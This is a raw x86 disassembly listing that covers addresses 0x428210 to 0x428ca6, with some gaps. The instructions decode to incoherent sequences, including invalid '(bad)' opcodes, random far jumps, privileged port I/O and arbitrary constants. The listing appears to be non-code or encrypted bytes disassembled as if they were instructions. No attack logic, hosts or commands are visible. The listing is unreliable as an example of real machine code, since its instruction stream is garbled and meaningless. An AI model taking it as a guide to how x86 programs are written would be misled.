  428210:	add    BYTE PTR [edi+0x13],al
  428213:	aam    0xf0
  428215:	mov    ds:0xc73b126b,al
  42821a:	jbe    0x428251
  42821c:	mov    ah,0x2e
  42821e:	test   BYTE PTR [ebx],dl
  428220:	push   ds
  428221:	xor    eax,0x66bc8735
  428226:	loope  0x4282a0
  428228:	popf   
  428229:	mov    edi,0x90a88473
  42822e:	retf   
  42822f:	push   ecx
  428230:	(bad)  
  428232:	lahf   
  428233:	nop
  428234:	sahf   
  428235:	repz and eax,DWORD PTR [edi]
  428238:	adc    eax,0xef68ff3d
  42823d:	out    dx,eax
  42823e:	pop    ebp
  42823f:	mov    eax,ss:0x45e7c356
  428245:	shr    BYTE PTR [ebp+0x42fdabbe],1
  42824b:	jecxz  0x4282a8
  42824d:	jg     0x4282ad
  42824f:	mov    ebx,0x5737bead
  428254:	mov    DWORD PTR [edx],0xb4275b04
  42825a:	xchg   esp,eax
  42825b:	gs jmp 0x475de5a2
  428261:	push   es
  428262:	pop    ecx
  428263:	sub    eax,0xdf040bfd
  428268:	xadd   BYTE PTR [esi-0x1a],ah
  42826c:	imul   ebx,DWORD PTR [ecx+ecx*8],0xe24e7e25
  428273:	or     BYTE PTR [eax],dh
  428275:	cmp    ecx,edx
  428277:	int    0x1d
  428279:	jecxz  0x428272
  42827b:	aad    0x44
  42827d:	imul   ecx,ecx,0x6e721158
  428283:	jmp    0x428226
  428285:	aaa    
  428286:	push   esi
  428287:	int3   
  428288:	adc    al,0xcc
  42828a:	sbb    edi,edx
  42828c:	mov    ?,WORD PTR [esi]
  42828e:	cdq    
  42828f:	mov    dh,0xe7
  428291:	dec    eax
  428292:	out    0x1e,al
  428294:	fnstsw WORD PTR [eax+0x5505b873]
  42829a:	fadd   st,st(4)
  42829c:	inc    ebx
  42829d:	dec    ebp
  42829e:	lds    edx,FWORD PTR [ebx+0x6c72cf47]
  4282a4:	out    0xa3,al
  4282a6:	mov    edi,0xe6b30acc
  4282ab:	dec    esp
  4282ac:	bndldx bnd0,[esi+0x3e]
  4282b0:	fistp  DWORD PTR [ecx+0x59914a82]
  4282b6:	inc    eax
  4282b7:	and    bl,0x8c
  4282ba:	xor    BYTE PTR [edi-0x1a9d852b],bl
  4282c0:	add    BYTE PTR [edi+esi*8],bl
  4282c3:	adc    eax,ebp
  4282c5:	pop    ebp
  4282c6:	test   DWORD PTR [edx-0x6848c9d],edx
  4282cc:	pushf  
  4282cd:	mov    al,0xc9
  4282cf:	retf   
  4282d0:	and    edi,ebp
  4282d2:	and    eax,0xe2d5f4a9
  4282d7:	or     BYTE PTR [eax-0x62c9b6d],0xc6
  4282de:	push   es
  4282df:	lods   eax,DWORD PTR fs:[esi]
  4282e1:	jge    0x428294
  4282e3:	fstp   TBYTE PTR [ecx+0x237cba71]
  4282e9:	dec    esp
  4282ea:	and    esp,DWORD PTR [ebp+ebp*1+0x57]
	...
  428355:	add    bh,al
  428357:	fidiv  WORD PTR [esi]
  428359:	loop   0x42839a
  42835b:	jmp    0x5c37:0x7b70ffd7
  428362:	push   es
  428363:	(bad)  
  428364:	pop    ebx
  428365:	jg     0x4283ce
  428367:	scas   eax,DWORD PTR es:[edi]
  428368:	add    DWORD PTR [eax],eax
  42836a:	add    BYTE PTR [ecx],al
  42836c:	add    BYTE PTR [eax],al
  42836e:	les    ecx,FWORD PTR [edx]
  428370:	ins    BYTE PTR es:[edi],dx
  428371:	mov    esp,0x74544752
  428376:	mov    ebp,0xb35261c
  42837b:	mov    bh,0xd
  42837d:	pop    esp
  42837e:	gs push 0xffffffd5
  428381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428382:	sqrtps xmm6,XMMWORD PTR [ecx-0x53170545]
  428389:	loop   0x428341
  42838b:	pop    eax
  42838c:	push   ds
  42838d:	pop    ebx
  42838e:	pop    eax
  42838f:	mov    dl,BYTE PTR [esi-0x1f7e175d]
  428395:	xchg   edi,eax
  428396:	add    esi,esp
  428398:	jge    0x4283b9
  42839a:	sub    al,0x31
  42839c:	fidivr WORD PTR [edi+0x1f55359]
  4283a2:	push   ss
  4283a3:	add    ch,BYTE PTR [ebp+0x1c]
  4283a6:	xlat   BYTE PTR ds:[ebx]
  4283a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4283a8:	xor    cl,bh
  4283aa:	lods   al,BYTE PTR ds:[esi]
  4283ab:	adc    bl,al
  4283ad:	mov    ds:0x59cc7e29,al
  4283b2:	dec    edi
  4283b3:	mov    al,0xc1
  4283b5:	xor    eax,0xc3bd2c0d
  4283ba:	retf   
  4283bb:	sahf   
  4283bc:	pop    ds
  4283bd:	cmp    eax,0x7536b7a
  4283c2:	pop    eax
  4283c3:	popa   
  4283c4:	dec    esi
  4283c5:	add    ch,BYTE PTR [ebp+0x46]
  4283c8:	lea    edx,[edx+0x440d1470]
  4283ce:	mov    esi,ds
  4283d0:	push   ecx
  4283d1:	in     al,dx
  4283d2:	jge    0x42844f
  4283d4:	or     BYTE PTR [edi+0x1c],bh
  4283d7:	xor    cl,BYTE PTR [edi-0x4e46eaf0]
  4283dd:	pushf  
  4283de:	xchg   edi,eax
  4283df:	mov    ebp,0xfa150e5d
  4283e4:	sbb    BYTE PTR [edi-0x48],0x1e
  4283e8:	pop    edx
  4283e9:	xor    cl,BYTE PTR [ebp+0x1d]
  4283ec:	mov    dh,0x6
  4283ee:	and    eax,0xc974da0d
  4283f3:	loopne 0x4283af
  4283f5:	data16 in al,dx
  4283f7:	into   
  4283f8:	sub    BYTE PTR [ecx],dl
  4283fa:	push   edx
  4283fb:	jne    0x4283a9
  4283fd:	stos   BYTE PTR es:[edi],al
  4283fe:	sbb    al,0x5f
  428400:	lods   al,BYTE PTR ds:[esi]
  428401:	lds    esi,FWORD PTR [edx-0x188bca19]
  428407:	mov    edi,0x5793738e
  42840c:	xor    dh,BYTE PTR [ecx-0x735308ab]
  428412:	xchg   ebx,eax
  428413:	xlat   BYTE PTR ds:[ebx]
  428414:	xchg   ebp,edx
  428416:	test   eax,0x4fc1865d
  42841b:	cdq    
  42841c:	jp     0x428414
  42841e:	ret    
  42841f:	cmc    
  428420:	ja     0x428473
  428422:	fistp  WORD PTR [eax]
  428424:	mov    ch,0x60
  428426:	div    DWORD PTR [ecx+0x1d]
  428429:	into   
  42842a:	sub    BYTE PTR [eax+0x73d61dbb],bl
  428430:	mov    bh,0x1d
  428432:	push   cs
  428433:	mov    ebp,DWORD PTR [esi-0xb]
  428436:	or     ebp,esp
  428438:	add    al,0xad
  42843a:	ds jp  0x428477
  42843d:	cwde   
  42843e:	sub    eax,0x2848e6f9
  428443:	jb     0x4284a2
  428445:	pop    ecx
  428446:	outs   dx,BYTE PTR ds:[esi]
  428447:	xchg   edx,eax
  428448:	stc    
  428449:	pop    ebp
  42844a:	pushf  
  42844b:	sbb    ch,0xaa
  42844e:	dec    edx
  42844f:	add    BYTE PTR [eax+ebx*8-0x2fa27942],0x6b
  428457:	add    ebx,DWORD PTR [eax]
  428459:	adc    al,0x9b
  42845b:	or     BYTE PTR [ebx-0x72a19ad6],0x58
  428462:	sub    ah,bl
  428464:	sub    esp,ebp
  428466:	hlt    
  428467:	bound  ecx,QWORD PTR [ecx-0x14]
  42846a:	push   ebp
  42846b:	mov    bl,0xc4
  42846d:	into   
	...
  4284d6:	push   cs
  4284d7:	xchg   esp,eax
  4284d8:	jg     0x42853d
  4284da:	(bad)  
  4284db:	jmp    0x4284fb
  4284dd:	std    
  4284de:	mov    edi,0xbeabfb32
  4284e3:	sub    esp,DWORD PTR [ebp+0x1b06735]
  4284e9:	add    BYTE PTR [eax],al
  4284eb:	add    DWORD PTR [eax],eax
  4284ed:	add    ah,al
  4284ef:	mov    esi,0x8c6c86d
  4284f4:	(bad)  
  4284f5:	das    
  4284f6:	out    dx,eax
  4284f7:	int    0x91
  4284f9:	adc    al,BYTE PTR [eax]
  4284fb:	mov    ebx,0x2a336b51
  428500:	xchg   edx,eax
  428501:	int    0x0
  428503:	fs dec ebx
  428505:	or     edx,ebx
  428507:	and    cl,BYTE PTR [esi]
  428509:	lods   eax,DWORD PTR ds:[esi]
  42850a:	pop    esp
  42850b:	(bad)  
  42850c:	push   esi
  42850d:	jle    0x4284ad
  42850f:	pop    ds
  428510:	fs inc edi
  428512:	and    BYTE PTR [eax+0xf],ch
  428515:	mov    ds:0xc9ed0c28,al
  42851a:	inc    esi
  42851b:	leave  
  42851c:	fs out 0x7b,eax
  42851f:	and    esp,ebp
  428521:	mov    esp,DWORD PTR [ebp+0x723c5d96]
  428527:	ja     0x428514
  428529:	aad    0x2e
  42852b:	mov    DWORD PTR [edi-0x6c],edi
  42852e:	pop    esp
  42852f:	dec    esi
  428530:	sbb    BYTE PTR [edx+edx*4-0x4731d11a],bh
  428537:	mov    ds:0xb93e1c5e,al
  42853d:	aam    0x34
  42853f:	mov    bl,0x1c
  428541:	add    ebp,edx
  428543:	mov    ah,0xfb
  428545:	push   ebp
  428546:	retf   
  428547:	test   DWORD PTR [esi],ebx
  428549:	scas   al,BYTE PTR es:[edi]
  42854a:	adc    eax,0x7b8044db
  42854f:	dec    eax
  428550:	jb     0x42856a
  428552:	jno    0x428509
  428554:	cmp    al,0x5b
  428556:	ffree  st(2)
  428558:	icebp  
  428559:	cwde   
  42855a:	xor    cl,BYTE PTR [edx]
  42855c:	fild   DWORD PTR [eax-0x72212dbb]
  428562:	int3   
  428563:	pop    ebx
  428564:	in     eax,dx
  428565:	fadd   DWORD PTR [ecx]
  428567:	mov    esp,0xef58dbdc
  42856c:	retf   0x3a3f
  42856f:	(bad)  
  428571:	jns    0x42858e
  428573:	rcl    DWORD PTR [edi+0x26e43517],0xed
  42857a:	mov    edi,ds
  42857c:	cmp    DWORD PTR [ebp+0x3a],eax
  42857f:	das    
  428580:	shl    eax,1
  428582:	dec    eax
  428583:	jae    0x428527
  428585:	popa   
  428586:	imul   esi,DWORD PTR [ebx],0x13
  428589:	scas   eax,DWORD PTR es:[edi]
  42858a:	outs   dx,BYTE PTR ds:[esi]
  42858b:	push   edx
  42858c:	mov    ebp,DWORD PTR cs:[ebp-0x7b8842ec]
  428593:	out    dx,al
  428594:	pop    ds
  428595:	or     bh,BYTE PTR ds:0x245ec9f3
  42859b:	mov    ebp,0x529c0ff8
  4285a0:	cld    
  4285a1:	mov    esp,0xad5b2f79
  4285a6:	scas   eax,DWORD PTR es:[edi]
  4285a7:	das    
  4285a8:	ret    0x8442
  4285ab:	lods   al,BYTE PTR ds:[esi]
  4285ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4285ad:	or     BYTE PTR [eax],cl
  4285af:	sub    edx,esi
  4285b1:	pop    ss
  4285b2:	clc    
  4285b3:	jne    0x4285fb
  4285b5:	stc    
  4285b6:	loop   0x42853d
  4285b8:	outs   dx,BYTE PTR ds:[esi]
  4285b9:	sub    eax,DWORD PTR [edx+0x4e]
  4285bc:	push   esi
  4285bd:	loopne 0x4285ac
  4285bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4285c0:	sub    eax,0x24dd2415
  4285c5:	jne    0x42860b
  4285c7:	push   es
  4285c8:	jnp    0x4285de
  4285ca:	sub    DWORD PTR [edx+0x55],eax
  4285cd:	loopne 0x42859e
  4285cf:	xchg   ecx,eax
  4285d0:	addr16 aad 0x45
  4285d3:	jle    0x4285c4
  4285d5:	or     eax,0x3a80b944
  4285da:	jmp    0x5233:0x3230d1b9
  4285e1:	mov    cl,0xb9
  4285e3:	gs inc ebp
  4285e5:	cs repz sti 
  4285e8:	xor    al,BYTE PTR [eax-0x66]
  4285eb:	inc    eax
  4285ec:	xchg   dh,al
	...
  428656:	push   ecx
  428657:	div    BYTE PTR ds:0x5bffb73e
  42865d:	inc    edi
  42865f:	mov    esi,0x467ea3f6
  428664:	mul    ah
  428666:	addr16 mov cl,0x1
  428669:	add    BYTE PTR [eax],al
  42866b:	add    DWORD PTR [eax],eax
  42866d:	add    BYTE PTR [ecx+ebx*1],ch
  428670:	repz popf 
  428672:	jge    0x42865b
  428674:	je     0x42867b
  428676:	int3   
  428677:	jne    0x4286bc
  428679:	sub    BYTE PTR [ebx+esi*2+0x62],0xd6
  42867e:	inc    esi
  42867f:	add    dh,0x5e
  428682:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428683:	dec    eax
  428684:	mov    DWORD PTR [edx+0x8],edx
  428687:	mov    DWORD PTR [ecx-0x7e52bb8c],ecx
  42868d:	cmp    al,0xd0
  42868f:	or     ecx,DWORD PTR [eax]
  428691:	test   DWORD PTR [esi+eax*4-0x7816eb60],ecx
  428698:	pop    ds
  428699:	mov    eax,ebp
  42869b:	sti    
  42869c:	add    al,0x4d
  42869e:	mov    ds:0x528f2661,al
  4286a3:	mov    dl,0xc4
  4286a5:	into   
  4286a6:	mov    cl,0x15
  4286a8:	cmp    DWORD PTR [edi],edi
  4286aa:	stos   DWORD PTR es:[edi],eax
  4286ab:	(bad)  
  4286ac:	jle    0x428690
  4286ae:	shr    eax,1
  4286b0:	mov    ds:0xa587ed1a,al
  4286b5:	out    dx,eax
  4286b6:	les    eax,FWORD PTR [esi]
  4286b8:	push   edx
  4286b9:	ffree  st(7)
  4286bb:	xor    BYTE PTR [edx],dh
  4286bd:	pop    ebx
  4286be:	jae    0x4286db
  4286c0:	xchg   esi,eax
  4286c1:	sbb    DWORD PTR ds:0x1128dd4b,0x79
  4286c8:	lods   eax,DWORD PTR ds:[esi]
  4286c9:	or     BYTE PTR fs:[ebp-0x202adcd0],ch
  4286d0:	add    eax,0xe417f6fb
  4286d5:	repnz adc bl,BYTE PTR [ebx+0x1104b3af]
  4286dc:	fdiv   DWORD PTR [eax+esi*2+0x10]
  4286e0:	mov    DWORD PTR [edx-0x1a],esp
  4286e3:	add    edi,eax
  4286e5:	iret   
  4286e6:	and    esi,DWORD PTR [ebx+eiz*1]
  4286e9:	mov    ebp,0xd72f0e8c
  4286ee:	fist   DWORD PTR [ebp-0x339506ca]
  4286f4:	sbb    dh,BYTE PTR [ecx+0x1770f42c]
  4286fa:	or     bl,BYTE PTR [ebp+0x59e36333]
  428700:	xor    DWORD PTR [esi+0x4c],ebx
  428703:	(bad)
  428706:	push   edi
  428707:	xchg   esp,eax
  428708:	add    esp,DWORD PTR [edx]
  42870a:	sbb    BYTE PTR [esi],bh
  42870c:	imul   esi,ecx,0x6ea4efc1
  428712:	mov    esp,0xac7a43ec
  428717:	sar    DWORD PTR [eax+esi*8+0x6ed8d8ab],0x42
  42871f:	pop    esp
  428720:	dec    ebx
  428721:	cwde   
  428722:	and    DWORD PTR [esi],ebp
  428724:	mov    al,ds:0x762b2609
  428729:	mov    ecx,0xbc0633c6
  42872e:	aaa    
  42872f:	inc    ecx
  428730:	xchg   ebp,eax
  428731:	or     eax,0x5beb273f
  428736:	bound  ebp,QWORD PTR [edx-0x2c6a8d4e]
  42873c:	outs   dx,DWORD PTR ds:[esi]
  42873d:	shr    cl,1
  42873f:	inc    ebp
  428740:	jae    0x4287a9
  428742:	arpl   si,si
  428744:	cwde   
  428745:	dec    edx
  428746:	xor    DWORD PTR [esi-0x2e],ecx
  428749:	mov    esp,0x92260f16
  42874e:	fucomp st(4)
  428750:	xchg   ebp,eax
  428751:	jns    0x428797
  428753:	mov    eax,ds:0x7fdad690
  428758:	sub    eax,0x51cfdee3
  42875d:	cmp    eax,0x2db2887a
  428762:	cmc    
  428763:	xchg   DWORD PTR [edx-0x5e1d19a6],esp
  428769:	cld    
  42876a:	popa   
  42876b:	xor    eax,0xa8e1
	...
  4287d4:	add    BYTE PTR [eax],al
  4287d6:	push   esi
  4287d7:	pop    ebx
  4287d8:	xor    al,0x78
  4287da:	cmp    eax,0xe77f5e7f
  4287df:	inc    ebp
  4287e0:	call   0x160b12f8
  4287e5:	popf   
  4287e6:	addr16 mov dl,0x1
  4287e9:	add    BYTE PTR [eax],al
  4287eb:	add    DWORD PTR [eax],eax
  4287ed:	add    BYTE PTR [eax+eiz*8-0x1f],ah
  4287f1:	push   0xffffff83
  4287f3:	das    
  4287f4:	cld    
  4287f5:	and    eax,0xe715a6ea
  4287fa:	add    ebx,DWORD PTR [ecx+ecx*1-0x31]
  4287fe:	adc    dl,cl
  428800:	clc    
  428801:	dec    ebx
  428802:	(bad)
  428806:	sub    ah,BYTE PTR [ebx+0x667004fd]
  42880c:	sti    
  42880d:	fmul   DWORD PTR [ebx-0x3b54bac1]
  428813:	xor    BYTE PTR [esi+0x54439ef1],ch
  428819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42881a:	cmp    al,0xb4
  42881c:	shl    BYTE PTR [esi-0x8],cl
  42881f:	jns    0x4287d9
  428821:	ins    BYTE PTR es:[edi],dx
  428822:	dec    ebp
  428823:	loop   0x428899
  428825:	ret    
  428826:	or     dl,dl
  428828:	mov    cs,WORD PTR [edx+ebp*4-0x3ad8cd6f]
  42882f:	jmp    0x4287b2
  428831:	push   edi
  428832:	fistp  WORD PTR [ebx-0x17]
  428835:	leave  
  428836:	sbb    eax,0xb4cd50a
  42883b:	cmp    BYTE PTR fs:[edi+0x72],dh
  42883f:	loope  0x428877
  428841:	add    eax,0x1554af3c
  428846:	dec    eax
  428847:	adc    BYTE PTR [edx],ch
  428849:	pop    edx
  42884a:	scas   al,BYTE PTR es:[edi]
  42884b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42884c:	or     BYTE PTR [edx],dh
  42884e:	clc    
  42884f:	call   0x63c5:0x46d65298
  428856:	mov    esi,0xe168c66a
  42885b:	jae    0x4288a3
  42885d:	hlt    
  42885e:	inc    ebp
  42885f:	fs jge 0x42885a
  428862:	mov    esi,0x8debc72e
  428867:	pop    ds
  428868:	dec    ebp
  428869:	sub    DWORD PTR [ecx],esp
  42886b:	add    al,0x8e
  42886d:	jb     0x42885b
  42886f:	cmp    BYTE PTR [ebx+ecx*2-0x2c],ah
  428873:	jmp    0x4288f2
  428875:	mov    bh,0x92
  428877:	mov    bh,0x14
  428879:	mov    bh,BYTE PTR [eax+0x7a4860ed]
  42887f:	call   0xbb89:0x1dc87765
  428886:	cmp    ah,ah
  428888:	imul   DWORD PTR [eax+0x733c1fbb]
  42888e:	in     eax,0x88
  428890:	or     esp,eax
  428892:	dec    edx
  428893:	imul   ecx,DWORD PTR ds:0x8c1ba88f,0x15afd2aa
  42889d:	inc    esp
  42889e:	data16 xor al,0x29
  4288a1:	cdq    
  4288a2:	aam    0xd0
  4288a4:	dec    BYTE PTR [edx+ebp*8]
  4288a7:	sub    dh,BYTE PTR [edi-0x829a5a3]
  4288ad:	rol    BYTE PTR [ebx],0x9f
  4288b0:	les    eax,FWORD PTR [ebx-0x29f4cabb]
  4288b6:	pop    ds
  4288b7:	adc    al,0x37
  4288b9:	jb     0x4288e5
  4288bb:	scas   al,BYTE PTR es:[edi]
  4288bc:	cmp    ebx,DWORD PTR [ebp+0x36efb9ba]
  4288c2:	push   0xbc1754bf
  4288c7:	inc    edx
  4288c8:	mov    fs,WORD PTR [eax-0xd]
  4288cb:	shl    DWORD PTR [eax-0x2],1
  4288ce:	cmp    al,0x1c
  4288d0:	inc    ecx
  4288d1:	mov    ecx,0x6bfcf965
  4288d6:	push   eax
  4288d7:	sbb    ch,BYTE PTR ds:0x71d75a12
  4288dd:	mov    dh,0x15
  4288df:	loop   0x4288a1
  4288e1:	dec    ebp
  4288e2:	inc    eax
  4288e3:	cmp    DWORD PTR [esi],eax
  4288e5:	outs   dx,BYTE PTR ds:[esi]
  4288e6:	in     al,0x94
  4288e8:	aaa    
  4288e9:	fwait
  4288ea:	outs   dx,DWORD PTR ds:[esi]
  4288eb:	and    eax,0x81e8
	...
  428954:	add    BYTE PTR [eax],al
  428956:	es jp  0x4289ca
  428959:	les    edi,FWORD PTR [ebp-0x31]
  42895c:	mov    bh,0xfa
  42895e:	arpl   WORD PTR [esi+0xdc9d0f],bx
  428964:	fcom   QWORD PTR [esi]
  428966:	addr16 mov bl,0x1
  428969:	add    BYTE PTR [eax],al
  42896b:	add    DWORD PTR [eax],eax
  42896d:	add    BYTE PTR [edx-0x7979d8e0],al
  428973:	inc    eax
  428974:	lods   al,BYTE PTR ds:[esi]
  428975:	ins    DWORD PTR es:[edi],dx
  428976:	pusha  
  428977:	pop    ebx
  428978:	(bad)  
  428979:	idiv   DWORD PTR [esp+edx*4]
  42897c:	cdq    
  42897d:	sbb    BYTE PTR [eax-0x1b],al
  428980:	jae    0x42897a
  428982:	sbb    BYTE PTR [esi+0x335e7a7],ah
  428988:	retf   
  428989:	jb     0x4289b7
  42898b:	in     eax,dx
  42898c:	sub    BYTE PTR [ecx+0x37],0x72
  428990:	xchg   edx,eax
  428991:	repz pop edx
  428993:	mov    ah,0x5d
  428995:	and    esi,DWORD PTR [edi]
  428997:	cli    
  428998:	mov    ah,0x51
  42899a:	fdiv   DWORD PTR [esi+0x78]
  42899d:	out    dx,eax
  42899e:	imul   esi,DWORD PTR [edi],0x556cd843
  4289a4:	mov    edi,0xa2d9d364
  4289a9:	pop    es
  4289aa:	mov    eax,0xb041d6e
  4289af:	retf   0xc0a3
  4289b2:	or     al,BYTE PTR [eax-0x76]
  4289b5:	cld    
  4289b6:	out    0x61,al
  4289b8:	popf   
  4289b9:	imul   ecx,esi,0xffffff97
  4289bc:	imul   esp,DWORD PTR [esi-0x60],0xffffffcd
  4289c0:	popa   
  4289c1:	sub    BYTE PTR [ecx],cl
  4289c3:	mov    dl,0x9a
  4289c5:	out    dx,al
  4289c6:	mov    ah,0x99
  4289c8:	test   eax,0xac9b0f3b
  4289cd:	ret    
  4289ce:	mov    esi,0xb37e7a4
  4289d3:	xor    eax,0xe5b734d5
  4289d8:	jnp    0x4289b5
  4289da:	mov    DWORD PTR [esi-0x3dcdb8c5],eax
  4289e0:	daa    
  4289e1:	inc    ch
  4289e3:	and    edx,ebx
  4289e5:	dec    ebp
  4289e6:	fdivp  st(1),st
  4289e8:	ret    
  4289e9:	lods   eax,DWORD PTR ds:[esi]
  4289ea:	pop    ds
  4289eb:	mov    edx,0x2a24e317
  4289f0:	js     0x428a64
  4289f2:	(bad)  [edx+eax*2-0x472e32fe]
  4289f9:	(bad)  
  4289fa:	cmp    eax,0x5f79b64c
  4289ff:	dec    esi
  428a00:	mov    edi,0xfa12275e
  428a05:	aam    0x4b
  428a07:	(bad)  
  428a09:	cwde   
  428a0a:	ja     0x428998
  428a0c:	or     al,al
  428a0e:	clc    
  428a0f:	jle    0x428a5f
  428a11:	cmp    al,0x89
  428a13:	scas   al,BYTE PTR es:[edi]
  428a14:	or     DWORD PTR es:[edx],0x4c2b2da9
  428a1b:	test   al,0xa0
  428a1d:	adc    eax,0xa5e106d5
  428a22:	adc    bl,ah
  428a24:	cmc    
  428a25:	cwde   
  428a26:	xor    DWORD PTR [edx+0x565872a],edx
  428a2c:	jns    0x428a17
  428a2e:	xchg   esi,eax
  428a2f:	dec    esi
  428a30:	daa    
  428a31:	leave  
  428a32:	mov    cl,0x69
  428a34:	pop    edx
  428a35:	or     DWORD PTR [edi-0x7d],0xff2fbce2
  428a3c:	push   edi
  428a3d:	mov    ebp,0xa421ee8f
  428a42:	add    DWORD PTR [edi-0x3e2486e6],ecx
  428a48:	stos   BYTE PTR es:[edi],al
  428a49:	mov    cl,0xc1
  428a4b:	xchg   DWORD PTR [eax+0x48],edx
  428a4e:	xchg   ebx,eax
  428a4f:	inc    ecx
  428a50:	mov    BYTE PTR ds:0xcd68225a,ah
  428a56:	mov    esp,0xe2da5e71
  428a5b:	pop    eax
  428a5c:	mov    ebp,0xd4a3b7ac
  428a61:	push   esp
  428a62:	sahf   
  428a63:	rcl    DWORD PTR [edx+0x5d],1
  428a66:	sahf   
  428a67:	and    DWORD PTR [edi-0x6a],edi
  428a6a:	add    ebp,DWORD PTR [eax-0x3f]
  428a6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  428ad6:	dec    ebp
  428ad7:	or     al,0xf8
  428ad9:	pop    ebx
  428ada:	stc    
  428adb:	(bad)  
  428adc:	out    dx,eax
  428add:	push   ds
  428ade:	pop    ds
  428adf:	bound  edx,QWORD PTR [eax+0x656a7013]
  428ae5:	push   esp
  428ae6:	addr16 mov ah,0x1
  428ae9:	add    BYTE PTR [eax],al
  428aeb:	add    DWORD PTR [eax],eax
  428aed:	add    BYTE PTR [edi+0x409eb64d],ch
  428af3:	je     0x428a94
  428af5:	adc    ecx,DWORD PTR [ecx+0x22]
  428af8:	(bad)  [ebx]
  428afa:	jb     0x428b6a
  428afc:	adc    al,0xed
  428afe:	jmp    0x428b72
  428b00:	out    dx,al
  428b01:	jp     0x428b3e
  428b03:	lds    ecx,FWORD PTR [ebx-0x6860daf1]
  428b09:	pop    ebx
  428b0a:	sbb    DWORD PTR [esi-0x338f5755],ecx
  428b10:	xor    BYTE PTR [ebx+0x5a],0x8
  428b14:	loope  0x428ac5
  428b16:	dec    esp
  428b17:	rcl    DWORD PTR [edx+0x1006dc22],cl
  428b1d:	ins    BYTE PTR es:[edi],dx
  428b1e:	out    0xb5,al
  428b20:	pop    DWORD PTR [edi-0x1782cfb9]
  428b26:	sbb    DWORD PTR [edi-0x28],ebp
  428b29:	iret   
  428b2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428b2b:	sbb    eax,0xfe0f4022
  428b30:	jge    0x428ab5
  428b32:	pop    es
  428b33:	popa   
  428b34:	rcl    DWORD PTR [ecx-0x4c47ee51],cl
  428b3a:	and    bh,BYTE PTR [ecx]
  428b3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428b3d:	and    ecx,edx
  428b3f:	or     al,0x13
  428b41:	out    dx,al
  428b42:	jnp    0x428ae8
  428b44:	jne    0x428b4c
  428b46:	cdq    
  428b47:	ror    DWORD PTR [edi+esi*4],0x5b
  428b4b:	addr16 jbe 0x428ad0
  428b4e:	jge    0x428ad2
  428b50:	daa    
  428b51:	mov    ecx,DWORD PTR [ecx-0x39]
  428b54:	cmp    eax,DWORD PTR [edx+0x3453f6ee]
  428b5a:	stos   BYTE PTR es:[di],al
  428b5c:	push   eax
  428b5d:	mov    ch,BYTE PTR [ecx+edx*4]
  428b60:	dec    edx
  428b61:	pusha  
  428b62:	mov    dh,0xa7
  428b64:	scas   eax,DWORD PTR es:[edi]
  428b65:	xor    al,0xa
  428b67:	mov    esi,0x5edbdb33
  428b6c:	ss scas al,BYTE PTR es:[edi]
  428b6e:	jb     0x428b6e
  428b70:	adc    ebp,ebp
  428b72:	xor    DWORD PTR [ecx],eax
  428b74:	mov    ebx,0xb96eebd9
  428b79:	lds    ebx,FWORD PTR [edx+0x422675b]
  428b7f:	jmp    0x428bbc
  428b81:	jae    0x428bb6
  428b83:	out    0xef,al
  428b85:	loop   0x428b0a
  428b87:	mov    ecx,0xbb9fae11
  428b8c:	stc    
  428b8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428b8e:	mov    ebp,0xffc04df2
  428b93:	xor    al,0x12
  428b96:	inc    ebx
  428b97:	inc    eax
  428b98:	daa    
  428b99:	shl    DWORD PTR [esi-0x2c],cl
  428b9c:	jmp    0xe58c:0xb62e9fd8
  428ba3:	add    BYTE PTR [eax],0xdd
  428ba6:	sub    BYTE PTR [edi-0x608c6328],al
  428bac:	jecxz  0x428b72
  428bae:	dec    edi
  428baf:	rcl    BYTE PTR [eax-0x1d],1
  428bb2:	add    ch,bh
  428bb4:	pmullw mm2,QWORD PTR [edi+0x10e05ab5]
  428bbb:	nop
  428bbc:	lods   eax,DWORD PTR ds:[esi]
  428bbd:	dec    esi
  428bbe:	dec    esp
  428bbf:	mov    al,ds:0xcb45dc4b
  428bc4:	sti    
  428bc5:	dec    edx
  428bc6:	push   ss
  428bc7:	dec    esp
  428bc8:	sar    edi,0xe8
  428bcb:	push   0xffffffa1
  428bcd:	jne    0x428c3c
  428bcf:	sahf   
  428bd0:	lahf   
  428bd1:	inc    eax
  428bd2:	(bad)  
  428bd3:	out    dx,al
  428bd4:	data16 aad 0xa2
  428bd7:	(bad)  
  428bd8:	lock (bad) 
  428bda:	in     eax,dx
  428bdb:	mov    es,edi
  428bdd:	jb     0x428be4
  428bdf:	das    
  428be0:	call   0xac69f25b
  428be5:	mov    ch,0x9e
  428be7:	mov    al,ds:0x17717a8b
  428bec:	mov    eax,ds:0x75
	...
  428c55:	add    ch,al
  428c57:	push   ebp
  428c58:	mov    bh,dl
  428c5a:	call   0xbbc:0x947ff5ff
  428c61:	push   0x91fc88b5
  428c66:	addr16 mov ch,0x1
  428c69:	add    BYTE PTR [eax],al
  428c6b:	add    DWORD PTR [eax],eax
  428c6d:	add    BYTE PTR [ebx-0xa],bh
  428c70:	inc    edi
  428c71:	adc    ah,BYTE PTR [eax+0x48]
  428c74:	clc    
  428c75:	jmp    0x6e74:0xd8bdd32a
  428c7c:	jecxz  0x428c71
  428c7e:	xor    BYTE PTR fs:[esi-0x7f],dl
  428c82:	hlt    
  428c83:	jnp    0x428c13
  428c85:	ins    BYTE PTR es:[edi],dx
  428c86:	js     0x428d00
  428c88:	pop    ebp
  428c89:	cmc    
  428c8a:	jno    0x428cb6
  428c8c:	add    ah,BYTE PTR [edi]
  428c8e:	jbe    0x428c8d
  428c90:	xchg   edx,esi
  428c92:	xor    BYTE PTR [edi-0x26],0xd3
  428c96:	lods   eax,DWORD PTR ds:[esi]
  428c97:	dec    esi
  428c98:	mov    ebx,0xb52ffddb
  428c9d:	pop    eax
  428c9e:	icebp  
  428c9f:	xchg   esp,eax
  428ca0:	adc    esp,esi
  428ca2:	cli    
  428ca3:	imul   BYTE PTR [edi-0x4]
  428ca6:	jecxz  0x428ce3
